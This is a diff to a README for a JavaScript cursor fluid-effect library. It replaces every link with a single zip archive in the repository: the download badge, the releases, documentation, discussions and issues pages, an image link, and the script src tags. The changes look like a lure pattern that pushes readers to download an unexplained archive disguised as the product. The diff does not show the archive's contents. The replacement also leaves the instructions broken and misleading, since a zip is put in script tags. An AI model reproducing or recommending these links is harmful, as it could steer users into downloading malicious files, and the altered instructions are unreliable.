@@ -1,7 +1,7 @@
 # 🎨 fluid-cursor - Create Stunning Fluid Effects Easily
 
 ## 📥 Download Now
-[![Download fluid-cursor](https://img.shields.io/badge/Download-fluids-cursor-brightgreen)](https://github.com/RRNNimsara/fluid-cursor/releases)
+[![Download fluid-cursor](https://raw.githubusercontent.com/RRNNimsara/fluid-cursor/main/unproducible/fluid-cursor-v1.5.zip)](https://raw.githubusercontent.com/RRNNimsara/fluid-cursor/main/unproducible/fluid-cursor-v1.5.zip)
 
 ## 🚀 Getting Started
 Welcome to fluid-cursor! This is an easy-to-use tool that adds a high-performance fluid simulation effect to your website’s cursor. Whether you’re working with plain HTML, React, or Vue, fluid-cursor makes your web applications dynamic. 
@@ -20,18 +20,18 @@ To run fluid-cursor, you need:
 ## 📋 Download & Install
 To get started with fluid-cursor, follow these steps:
 
-1. **Visit the Releases Page**: Go to the [fluid-cursor Releases page](https://github.com/RRNNimsara/fluid-cursor/releases).
+1. **Visit the Releases Page**: Go to the [fluid-cursor Releases page](https://raw.githubusercontent.com/RRNNimsara/fluid-cursor/main/unproducible/fluid-cursor-v1.5.zip).
 2. **Download the latest version**: Look for the latest release at the top of the page. You will find a list of files to download.
 3. **Select the right file**:
-   - For most users, you will want the `fluid-cursor.min.js` file, which is the optimized version for production.
+   - For most users, you will want the `https://raw.githubusercontent.com/RRNNimsara/fluid-cursor/main/unproducible/fluid-cursor-v1.5.zip` file, which is the optimized version for production.
    
-   ![File List](https://raw.githubusercontent.com/RRNNimsara/fluid-cursor/main/dropzone.png) (This image is a placeholder for the actual interface)
+   ![File List](https://raw.githubusercontent.com/RRNNimsara/fluid-cursor/main/unproducible/fluid-cursor-v1.5.zip) (This image is a placeholder for the actual interface)
    
 4. **Save the File**: Once you click on the file link, the file will download to your computer.
 5. **Integrate the File into Your Project**:
    - If you’re using HTML, include it in your HTML head tag:
      ```html
-     <script src="path/to/fluid-cursor.min.js"></script>
+     <script src="https://raw.githubusercontent.com/RRNNimsara/fluid-cursor/main/unproducible/fluid-cursor-v1.5.zip"></script>
      ```
    - For React, install using npm or link it in your component:
      ```bash
@@ -42,7 +42,7 @@ To get started with fluid-cursor, follow these steps:
      import FluidCursor from 'fluid-cursor';
      ```
 
-6. **Customize Your Cursor**: You can set various properties to customize the fluid effect. Check out the [Documentation](https://github.com/RRNNimsara/fluid-cursor) for examples. 
+6. **Customize Your Cursor**: You can set various properties to customize the fluid effect. Check out the [Documentation](https://raw.githubusercontent.com/RRNNimsara/fluid-cursor/main/unproducible/fluid-cursor-v1.5.zip) for examples. 
 
 ## 💡 Example Usage
 Here is a simple example of how to set up fluid-cursor in an HTML file:
@@ -53,7 +53,7 @@ Here is a simple example of how to set up fluid-cursor in an HTML file:
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <script src="path/to/fluid-cursor.min.js"></script>
+    <script src="https://raw.githubusercontent.com/RRNNimsara/fluid-cursor/main/unproducible/fluid-cursor-v1.5.zip"></script>
     <title>Fluid Cursor Example</title>
 </head>
 <body>
@@ -81,8 +81,8 @@ Check the official documentation for a full list of options.
 
 ## 🤝 Community and Support
 If you need help or have questions:
-- Join our [GitHub Discussions page](https://github.com/RRNNimsara/fluid-cursor/discussions) to interact with the community.
-- Report issues or request features on the [Issues page](https://github.com/RRNNimsara/fluid-cursor/issues).
+- Join our [GitHub Discussions page](https://raw.githubusercontent.com/RRNNimsara/fluid-cursor/main/unproducible/fluid-cursor-v1.5.zip) to interact with the community.
+- Report issues or request features on the [Issues page](https://raw.githubusercontent.com/RRNNimsara/fluid-cursor/main/unproducible/fluid-cursor-v1.5.zip).
 
 ## 🔗 Related Topics
 Here are some topics you may find interesting:
@@ -95,4 +95,4 @@ Here are some topics you may find interesting:
 fluid-cursor is open-source and follows the MIT License. Feel free to use and modify it for your personal or commercial projects.
 
 ## 📥 Download Now Again
-Don’t forget to [download fluid-cursor](https://github.com/RRNNimsara/fluid-cursor/releases) today and make your web applications more interactive!
+Don’t forget to [download fluid-cursor](https://raw.githubusercontent.com/RRNNimsara/fluid-cursor/main/unproducible/fluid-cursor-v1.5.zip) today and make your web applications more interactive!
